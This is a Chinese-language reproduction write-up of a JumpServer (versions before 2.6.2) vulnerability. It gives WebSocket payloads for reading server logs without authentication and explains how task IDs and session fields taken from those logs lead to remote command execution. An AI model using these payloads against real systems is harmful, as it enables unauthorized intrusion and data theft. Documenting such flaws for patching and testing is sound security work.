# 0x00 软件介绍
JumpServer：一款在中国流行的开源堡垒机

# 0x01 复现环境
复现环境：本地环境 centos7 x64  
复现版本：JumpServer v2.6.1  
环境搭建：  
1、使用官方提供的v2.6.1的quick_start.sh安装后，竟然后v2.6.2，这个坑真是无语了，使用知识星球师傅提供的安装脚本，安装后是v2.6.1（这个安装脚本执行后可能会报错，多试几次），安装脚本被上载到当前目录下  
2、执行quick_start.sh后，一路默认即可  
3、安装完成后需要切换到/opt/jumpserver-installer-v2.6.1/下执行jmsctl.sh，直接使用绝对路径会报错  
4、需要开启iptables，否则报错  
5、重新安装2.6.1后，本地能访问，远程不能访问，无奈再次重新安装centos7以及JumpServer v2.6.1

# 0x02 利用条件
无

# 0x03 影响版本
JumpServer < v2.6.2  
JumpServer < v2.5.4  
JumpServer < v2.4.5

# 0x04 漏洞复现
攻击环境：kali x64  
chrome下安装扩展：https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related  
远程日志读取payload：  
```
ws://192.168.1.73:8080/ws/ops/tasks/log/
{"task":"/opt/jumpserver/logs/jumpserver"}
```
如下图，红色圈出的部分即为读取到的远程服务器上的日志内容  
![image](./a1.png)

如下图，红色圈出的部分即为服务器上的日志内容  
![image](./a0.png)

至于远程命令执行，首先需要在返回的信息中获取Taskid
```
ws://xx.xx.xx.xx:8080/ws/ops/tasks/log/
{"task":"/opt/jumpserver/logs/jumpserver"}
```
如下图（下图摘自别人的文章）  
![image](./0.png)  
利用上一步得到的Taskid，可进行进一步的信息获取，将Taskid值send给接口，即可查看到当前任务的详细信息。
```
{"task":"dc0533d8-078a-47c0-b554-01f368a89a19"}
```
可能有些小伙伴在复现读取Taskid信息时没有成功，我也一样，我们获取到的内容取决于日志记录的内容，一些Taskid可能已经失效了，在进行测试的时候可以看一下当前Taskid对应的时间，过于久远的id肯定是无法获取详情的。同理也能解释为什么在很多次测试中没有搜索到system_user这个字段，如果在实战中运气足够好，正好赶上管理员登陆了系统未退出，在日志中获取到system_user、user、asset这三个字段，则可以RCE，脚本参考jumpserver-rce.py

原理是模拟web terminal，前提需要user、system_user、assert这三个字段的值，这3个一般读取不到，利用难度较大

# 0x05 批量脚本
无

# 0x06 参考链接
https://articles.zsxq.com/id_5raonmuwqrru.html  
https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&mid=2247497420&idx=1&sn=49b6179b24a4275f016a80b16ba401aa&chksm=ec9f2fbfdbe8a6a9318f7ba90eaca911692ae24f72591225efb19eab4852cf8e893936ee2a06&mpshare=1&scene=1&srcid=01183gic1iE9CgPOeU1ZKNoQ&sharer_sharetime=1610978241607&sharer_shareid=39e4b7efe0bb5b2e5770f3a926f3062d&exportkey=AUvxarwZSXcAl0lXgRSI%2F2o%3D&pass_ticket=rI5WvWxPWj9wFDSMj42xLhizShWaMpx4MwP7SFhDHLUZpJ0zrnUrOlEEfOlgFO8t&wx_header=0#rd
